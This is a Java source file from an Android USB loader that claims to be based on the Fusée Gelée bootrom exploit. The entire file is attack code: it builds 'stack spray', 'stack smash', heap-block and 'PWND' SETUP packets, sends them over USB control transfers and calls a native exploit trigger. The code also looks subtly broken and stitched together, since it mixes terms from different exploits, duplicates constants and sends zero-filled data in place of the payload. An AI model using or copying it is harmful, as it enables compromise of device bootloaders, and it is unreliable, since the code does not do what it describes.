package io.github.davidbuchanan314.nxloader;

/*
 * This exploit is based on fusée gelée: https://github.com/reswitched/fusee-launcher
 */

import android.content.Context;
import android.hardware.usb.UsbConstants;
import android.hardware.usb.UsbDevice;
import android.hardware.usb.UsbDeviceConnection;
import android.hardware.usb.UsbInterface;
import android.hardware.usb.UsbManager;

import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.Arrays;

public class PrimaryLoader implements USBDevHandler {
    private static final int RCM_PAYLOAD_ADDR = 0x40010000;
    private static final int INTERMEZZO_LOCATION = 0x4001F000;
    private static final int PAYLOAD_LOAD_BLOCK = 0x40020000;
    private static final int MAX_LENGTH = 0x30298;

    private static final int SETUP_VENDOR_OUT = UsbConstants.USB_DIR_OUT | UsbConstants.USB_TYPE_VENDOR | 0x01; // recipient interface
    private static final int REQUEST_HEADER = 0x10;
    private static final int REQUEST_RESERVED = 0x11;
    private static final int REQUEST_STACK_SPRAY = 0x12;
    private static final int REQUEST_HEAP_BLOCK = 0x13;
    private static final int REQUEST_PWND = 0x14;
    private static final int REQUEST_PADDING = 0x15;

    // Used to load the 'native-lib' library on startup.
    static {
        System.loadLibrary("native-lib");
    }

    public void handleDevice(Context context, UsbDevice device) {
        Logger.log(context, "[+] Launching primary payload!!!");

        UsbDeviceConnection conn = null;
        UsbInterface intf = null;

        try {
            // Use hardcoded constants only (do not read example files)
            long rcmAddr = T8Constants.RCM_PAYLOAD_ADDR;
            long intermezzoLoc = T8Constants.INTERMEZZO_LOCATION;
            long payloadBlock = T8Constants.PAYLOAD_LOAD_BLOCK;
            int maxLength = T8Constants.MAX_LENGTH;
            int stackEnd = T8Constants.STACK_END;

            Logger.log(context, "[*] Using constants: RCM_PAYLOAD_ADDR=0x" + Long.toHexString(rcmAddr) + " INTERMEZZO_LOCATION=0x" + Long.toHexString(intermezzoLoc) + " PAYLOAD_LOAD_BLOCK=0x" + Long.toHexString(payloadBlock) + " MAX_LENGTH=" + maxLength + " STACK_END=0x" + Integer.toHexString(stackEnd));

            UsbManager mUsbManager = (UsbManager) context.getSystemService(Context.USB_SERVICE);
            if (mUsbManager == null) {
                Logger.log(context, "[-] UsbManager unavailable");
                return;
            }

            int interfaceCount = device.getInterfaceCount();
            Logger.log(context, "[*] USB device has " + interfaceCount + " interface(s)");
            if (interfaceCount <= 0) {
                Logger.log(context, "[-] No USB interfaces available on device");
                return;
            }

            intf = device.getInterface(0);
            if (intf == null) {
                Logger.log(context, "[-] USB interface 0 not found");
                return;
            }

            Logger.log(context, "[*] Using interface 0 for control transfers");

            conn = mUsbManager.openDevice(device);
            if (conn == null) {
                Logger.log(context, "[-] Failed to open USB device connection");
                return;
            }

            Logger.log(context, "[*] USB device connection opened");

            if (!conn.claimInterface(intf, true)) {
                Logger.log(context, "[-] Failed to claim USB interface");
                return;
            }

            Logger.log(context, "[*] Claimed USB interface successfully");

            /* Step 1: Probe device with a standard GET_STATUS control request */
            byte[] deviceStatus = new byte[2];
            int statusBytes = conn.controlTransfer(UsbConstants.USB_DIR_IN | UsbConstants.USB_TYPE_STANDARD | 0x00,
                    0x00, 0, 0, deviceStatus, deviceStatus.length, 999);
            Logger.log(context, "[*] controlTransfer GET_STATUS returned " + statusBytes + " bytes");
            if (statusBytes > 0) {
                Logger.log(context, "[+] Device status: " + Utils.bytesToHex(deviceStatus));
            }

            Logger.log(context, "[*] Building explicit SETUP packet stream from exploit semantics");
            byte[] setupStream = buildSetupPacketStream(maxLength, rcmAddr, intermezzoLoc, payloadBlock, context);
            Logger.log(context, "[*] Built SETUP stream of " + setupStream.length + " bytes");

            Logger.log(context, "[*] Sending payload via control transfers (endpoint 0)");
            int bytes_sent = sendPayloadViaControl(conn, setupStream, context);
            if (bytes_sent < 0) {
                Logger.log(context, "[-] Control transfer payload failed");
                return;
            }
            Logger.log(context, "[+] Sent " + bytes_sent + " bytes of payload via control transfers");

            Logger.log(context, "[*] Triggering exploit with fd=" + conn.getFileDescriptor() + " stackEnd=0x" + Integer.toHexString(stackEnd));
            int result = nativeTriggerExploit(conn.getFileDescriptor(), stackEnd);
            Logger.log(context, "[*] nativeTriggerExploit returned " + result);

            switch (result) {
                case 0:
                    Logger.log(context, "[+] Exploit triggered!");
                    break;
                case -1:
                    Logger.log(context, "[-] SUBMITURB failed :(");
                    break;
                case -2:
                    Logger.log(context, "[-] DISCARDURB failed :(");
                    break;
                case -3:
                    Logger.log(context, "[-] REAPURB failed :(");
                    break;
                case -4:
                    Logger.log(context, "[-] Wrong URB reaped :( Maybe that doesn't matter?");
                    break;
                default:
                    Logger.log(context, "[-] Unexpected native trigger result: " + result);
                    break;
            }
        } catch (Exception e) {
            Logger.log(context, "[-] Exception in PrimaryLoader.handleDevice: " + e.toString());
        } finally {
            if (conn != null && intf != null) {
                try {
                    conn.releaseInterface(intf);
                    Logger.log(context, "[*] Released USB interface");
                } catch (Exception e) {
                    Logger.log(context, "[-] Failed to release USB interface: " + e.toString());
                }
            }
            if (conn != null) {
                try {
                    conn.close();
                    Logger.log(context, "[*] Closed USB connection");
                } catch (Exception e) {
                    Logger.log(context, "[-] Failed to close USB connection: " + e.toString());
                }
            }
        }
    }

    private int sendPayloadViaControl(UsbDeviceConnection conn, byte[] payload, Context context) {
        int totalSent = 0;
        int packetIndex = 0;
        int offset = 0;

        while (offset < payload.length) {
            int chunkSize = Math.min(8, payload.length - offset);
            byte[] chunk = new byte[8];
            System.arraycopy(payload, offset, chunk, 0, chunkSize);
            if (chunkSize < 8) {
                Arrays.fill(chunk, chunkSize, 8, (byte) 0);
            }

            int requestType = chunk[0] & 0xFF;
            int request = chunk[1] & 0xFF;
            int value = (chunk[3] & 0xFF) << 8 | (chunk[2] & 0xFF);
            int index = (chunk[5] & 0xFF) << 8 | (chunk[4] & 0xFF);
            int length = (chunk[7] & 0xFF) << 8 | (chunk[6] & 0xFF);

            Logger.log(context, "[*] Sending SETUP packet " + packetIndex + " type=0x" + Integer.toHexString(requestType) + " req=0x" + Integer.toHexString(request) + " value=0x" + Integer.toHexString(value) + " index=0x" + Integer.toHexString(index) + " length=" + length + " offset=" + offset);

            byte[] dataStage = null;
            if (length > 0) {
                if ((requestType & UsbConstants.USB_DIR_IN) != 0) {
                    dataStage = new byte[length];
                } else {
                    dataStage = new byte[length];
                    Arrays.fill(dataStage, (byte) 0x00);
                }
            }

            int result = conn.controlTransfer(requestType,
                    request,
                    value,
                    index,
                    dataStage,
                    length,
                    999);

            Logger.log(context, "[*] controlTransfer returned " + result + " for packet " + packetIndex);
            if (result < 0) {
                return -1;
            }

            totalSent += chunkSize;
            offset += chunkSize;
            packetIndex++;
        }

        return totalSent;
    }

    private byte[] buildSetupPacketStream(int maxLength, long rcmAddr, long intermezzoLoc, long payloadBlock, Context context) {
        ByteBuffer stream = ByteBuffer.allocate(maxLength);
        stream.order(ByteOrder.LITTLE_ENDIAN);

        stream.put(makeSetupPacket(SETUP_VENDOR_OUT,
                REQUEST_HEADER,
                maxLength & 0xFFFF,
                (maxLength >> 16) & 0xFFFF,
                0));
        Logger.log(context, "[*] Added initial setup packet encoding maxLength");

        int reservedPackets = (676 + 7) / 8;
        for (int i = 0; i < reservedPackets; i++) {
            stream.put(makeSetupPacket(SETUP_VENDOR_OUT,
                    REQUEST_RESERVED,
                    0,
                    0,
                    0));
        }
        Logger.log(context, "[*] Added " + reservedPackets + " reserved header setup packets");

        int stackFillCount = (int) ((intermezzoLoc - rcmAddr) / 4);
        for (int i = 0; i < stackFillCount; i++) {
            stream.put(makeSetupPacket(SETUP_VENDOR_OUT,
                    REQUEST_STACK_SPRAY,
                    (int) (intermezzoLoc & 0xFFFF),
                    (int) ((intermezzoLoc >> 16) & 0xFFFF),
                    0));
        }
        Logger.log(context, "[*] Added " + stackFillCount + " explicit stack smash setup packets");

        for (long blk : T8Constants.HEAP_BLOCKS) {
            stream.put(makeSetupPacket(SETUP_VENDOR_OUT,
                    REQUEST_HEAP_BLOCK,
                    (int) (blk & 0xFFFF),
                    (int) ((blk >> 16) & 0xFFFF),
                    0));
        }
        Logger.log(context, "[*] Added " + T8Constants.HEAP_BLOCKS.length + " heap block setup packets");

        try {
            byte[] pw = T8Constants.PWND_STR.getBytes("US-ASCII");
            for (int i = 0; i < pw.length; i += 4) {
                int chunk = 0;
                for (int j = 0; j < 4 && i + j < pw.length; j++) {
                    chunk |= (pw[i + j] & 0xFF) << (8 * j);
                }
                stream.put(makeSetupPacket(SETUP_VENDOR_OUT,
                        REQUEST_PWND,
                        chunk & 0xFFFF,
                        (chunk >> 16) & 0xFFFF,
                        0));
            }
            Logger.log(context, "[*] Added PWND string as explicit setup packet payload");
        } catch (Exception e) {
            Logger.log(context, "[-] Failed to append PWND string as setup packets: " + e.toString());
        }

        int pad = (int) Math.max(0, Math.min(maxLength, payloadBlock - intermezzoLoc));
        int paddingPackets = (pad + 7) / 8;
        for (int i = 0; i < paddingPackets; i++) {
            stream.put(makeSetupPacket(SETUP_VENDOR_OUT,
                    REQUEST_PADDING,
                    0,
                    0,
                    0));
        }
        Logger.log(context, "[*] Added " + paddingPackets + " padding setup packets to reach payload block");

        int remaining = maxLength - stream.position();
        if (remaining > 0) {
            byte[] trailing = new byte[remaining];
            Arrays.fill(trailing, (byte) 0xAA);
            stream.put(trailing);
            Logger.log(context, "[*] Filled remaining " + remaining + " bytes with debug pattern");
        }

        return stream.array();
    }

    private byte[] makeSetupPacket(int requestType, int request, int value, int index, int length) {
        byte[] packet = new byte[8];
        packet[0] = (byte) requestType;
        packet[1] = (byte) request;
        packet[2] = (byte) (value & 0xFF);
        packet[3] = (byte) ((value >> 8) & 0xFF);
        packet[4] = (byte) (index & 0xFF);
        packet[5] = (byte) ((index >> 8) & 0xFF);
        packet[6] = (byte) (length & 0xFF);
        packet[7] = (byte) ((length >> 8) & 0xFF);
        return packet;
    }


    /**
     * A native method that is implemented by the 'native-lib' native library,
     * which is packaged with this application.
     */
    public native int nativeTriggerExploit(int fd, int length);
}
